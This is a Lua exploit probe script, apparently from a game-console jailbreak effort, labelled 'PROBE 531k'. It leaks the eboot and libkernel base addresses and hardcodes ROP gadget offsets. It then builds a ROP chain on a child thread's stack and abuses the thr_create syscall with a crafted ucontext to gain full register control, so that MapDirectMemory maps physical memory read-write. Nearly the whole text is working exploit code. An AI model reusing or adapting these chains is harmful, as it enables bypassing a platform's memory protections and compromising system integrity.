-- CRASH_CLASS: HIGH
-- PROBE 531k: MapDirectMemory via thr_create(430) with full register control
--
-- Problem: MapDirectMemory (libkernel+0x15020) needs 7 args.
-- fcall_with_rax only passes 6 → 7th (name) = garbage → crash.
-- No pop_r8/pop_r9 gadgets in eboot (confirmed 386a, 531i).
--
-- Solution: thr_create(430) gives FULL register control via ucontext.
-- Set r8=phys_offset, r9=alignment, rdi..rcx=other args, rip=map_fn.
-- The 7th arg (name) goes at [rsp+8] per SysV ABI.
-- After map_fn returns, ROP chain stores result and exits.
--
-- From THR_CREATE_SETMCONTEXT_COPYMAP_13_60.md:
-- ctx+0x48..+0xB8 = 15 GPRs (rdi,rsi,rdx,rcx,r8,r9,rax,rbx,rbp,r10..r15)
-- ctx+0xE0 = RIP, ctx+0xF0 = RFLAGS, ctx+0xF8 = RSP, ctx+0x100 = SS
-- Gates: +0x108=0x480, +0x0D0<=7, +0x110=0x10000
-- CS=0x43 at +0x0C0 (ignored but set for safety), SS=0x3B at +0x100

print("=== PROBE 531k: THR_CREATE MAPDM ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function hexq(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local syscall_ret = stub  -- fn_addr IS a syscall;ret gadget (used in CHAIN_14_10)

local pid = N(native.fcall_with_rax(stub, 20))
print(string.format("pid=%d", pid))

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1))
for _, sig in ipairs({10, 11, 12, 13}) do
    pcall(function() mk(416)(uint64(sig), sa, uint64(0)) end)
end

-- Get eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0
local eb_hi = rd(N(ib) + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
print(string.format("eb=0x%X%08X", eb_hi, eb_lo))

-- Get libkernel base
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local lk_lo = rd(N(ib) + 0x108) or 0
local lk_hi = rd(N(ib) + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
local lk_base = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
print(string.format("lk=0x%X%08X", lk_hi, lk_lo))

local alloc_fn = lk_base + uint64(0x17EF0)
local map_fn = lk_base + uint64(0x15020)

-- Gadgets
local pop_rax_ret = eb + uint64(0x992)
local pop_rdi_ret = eb + uint64(0xC9DFE)
local mov_rdi_rax_ret = eb + uint64(0x92C67)  -- mov [rdi], rax; ret

-- [A] Allocate physical memory
print("[A] Alloc")
local phys_out = memory.alloc(8)
wq(N(phys_out), uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(N(phys_out)))
end)
local phys = rq(N(phys_out))
print(string.format("  phys=%s", hexq(phys)))
if not phys or N(phys) == 0 then print("FAIL") return end

-- [B] Shared communication page
print("[B] Shared")
local sc_477 = mk(477)
local shared = sc_477(uint64(0), uint64(0x4000), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local sn = N(shared)
print(string.format("  shared=0x%X", sn))
wq(sn, uint64(0xDEADDEAD))      -- [+0] rv from MapDM
wq(sn + 8, uint64(0xBEEFBEEF))  -- [+8] done marker
wq(sn + 0x10, uint64(0))        -- [+16] VA output

-- [C] Child stack + ROP chain
print("[C] Stack+Chain")
local stack_sz = 0x200000
local child_stack = sc_477(uint64(0), uint64(stack_sz), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local csn = N(child_stack)
local sp_top = csn + stack_sz

-- Build the return chain at sp_top - 0x1000
-- Leave space below for MapDirectMemory's internal stack frame
local chain = sp_top - 0x1000

-- SysV calling convention: at function entry,
-- [rsp+0] = return address (would be pushed by CALL, but we set RSP directly)
-- [rsp+8] = 7th argument (name pointer for Named variant)
-- MapDirectMemory's epilogue does RET → pops [rsp] into RIP

-- chain[0] = return address → post-call gadget chain
-- chain[8] = 7th arg = NULL (unnamed mapping)
local post_call = chain + 0x80
wq(chain + 0x00, uint64(post_call))  -- return addr
wq(chain + 0x08, uint64(0))          -- name = NULL

-- Post-call chain: store result, exit
local pc = post_call
wq(pc + 0x00, pop_rdi_ret)           -- pop rdi; ret
wq(pc + 0x08, uint64(sn))            -- rdi = shared[0]
wq(pc + 0x10, mov_rdi_rax_ret)       -- [rdi] = rax (rv) → shared[0]
wq(pc + 0x18, pop_rdi_ret)           -- pop rdi; ret
wq(pc + 0x20, uint64(sn + 8))        -- rdi = shared[8]
wq(pc + 0x28, pop_rax_ret)           -- pop rax; ret
wq(pc + 0x30, uint64(0x444F4E45))    -- rax = "DONE" marker
wq(pc + 0x38, mov_rdi_rax_ret)       -- [rdi] = rax → shared[8]
wq(pc + 0x40, pop_rax_ret)           -- pop rax; ret
wq(pc + 0x48, uint64(431))           -- rax = 431 (thr_exit)
wq(pc + 0x50, syscall_ret)           -- syscall; ret → thread exits

print(string.format("  chain=0x%X post_call=0x%X", chain, post_call))

-- [D] Build ucontext
print("[D] Context")
local ctx = memory.alloc(0x500)
for i = 0, 0x4BF, 8 do wq(N(ctx) + i, uint64(0)) end

-- Gates
wd(N(ctx) + 0x108, 0x480)
wd(N(ctx) + 0x0D0, 4)
wd(N(ctx) + 0x110, 0x10000)

-- Segments
wd(N(ctx) + 0x0C0, 0x43)    -- CS (ignored but set)
wd(N(ctx) + 0x100, 0x3B)    -- SS (raw copy)

-- RFLAGS
wq(N(ctx) + 0x0F0, uint64(0x202))

-- RSP and RIP
wq(N(ctx) + 0x0F8, uint64(chain))   -- RSP = our chain
wq(N(ctx) + 0x0E0, map_fn)          -- RIP = MapDirectMemory

-- GPRs at +0x48..+0xB8 (FreeBSD trapframe order):
-- +0x48=rdi, +0x50=rsi, +0x58=rdx, +0x60=rcx
-- +0x68=r8,  +0x70=r9,  +0x78=rax,  +0x80=rbx, +0x88=rbp

-- MapDirectMemory(void **addr, size_t len, int prot, int flags,
--                  off_t directMemoryStart, size_t alignment, const char *name)
-- arg1=rdi: pointer to VA output
wq(N(ctx) + 0x48, uint64(sn + 0x10))
-- arg2=rsi: length
wq(N(ctx) + 0x50, uint64(0x4000))
-- arg3=rdx: prot (3=RW)
wq(N(ctx) + 0x58, uint64(3))
-- arg4=rcx: flags (0)
wq(N(ctx) + 0x60, uint64(0))
-- arg5=r8: physical offset
wq(N(ctx) + 0x68, phys)
-- arg6=r9: alignment
wq(N(ctx) + 0x70, uint64(0x4000))
-- rax=0
wq(N(ctx) + 0x78, uint64(0))
-- rbp=0
wq(N(ctx) + 0x88, uint64(0))

print(string.format("  rdi=%s (out_ptr)", hexq(uint64(sn + 0x10))))
print(string.format("  r8=%s (phys)", hexq(phys)))

-- [E] Spawn child
print("[E] thr_create(430)")
local tid_out = memory.alloc(8)
wq(N(tid_out), uint64(0))

local sc_430 = mk(430)
local ok_tc, rv_tc = pcall(function()
    return sc_430(uint64(N(ctx)), uint64(N(tid_out)), uint64(0))
end)
print(string.format("  ok=%s rv=%s", tostring(ok_tc), ok_tc and hexq(rv_tc) or "FAIL"))
local tid = rq(N(tid_out))
print(string.format("  tid=%s", hexq(tid)))

-- Wait for child (busy wait)
print("[F] Wait...")
local done = false
for attempt = 1, 50 do
    local dummy = 0
    for i = 1, 100000 do dummy = dummy + 1 end
    local m = rq(sn + 8)
    if m then
        local mn = N(m)
        if mn ~= 0 and mn ~= -286331153 then  -- not 0xBEEFBEEF
            done = true
            break
        end
    end
end

-- Read results
print("[G] Results")
local result = rq(sn)
local marker = rq(sn + 8)
local va_out = rq(sn + 0x10)
print(string.format("  rv=%s", hexq(result)))
print(string.format("  marker=%s done=%s", hexq(marker), tostring(done)))
print(string.format("  va=%s", hexq(va_out)))

-- If VA was written, try to read!
if va_out and N(va_out) ~= 0 then
    print("[H] Read mapped!")
    local van = N(va_out)
    for off = 0, 0x1C, 4 do
        local ok_r, d = pcall(function() return memory.read_dword(van + off) end)
        if ok_r and d then
            local dn = N(d)
            if dn < 0 then dn = dn + 0x100000000 end
            print(string.format("  [+0x%02X] 0x%08X", off, dn))
        else
            print(string.format("  [+0x%02X] FAULT", off))
            break
        end
    end
    -- Write test
    pcall(function() memory.write_dword(van, 0xCAFEBABE) end)
    local rb = rd(van)
    if rb then
        if rb < 0 then rb = rb + 0x100000000 end
        print(string.format("  rw_test=0x%08X", rb))
    end
end

print("")
print("=== 531k DONE ===")
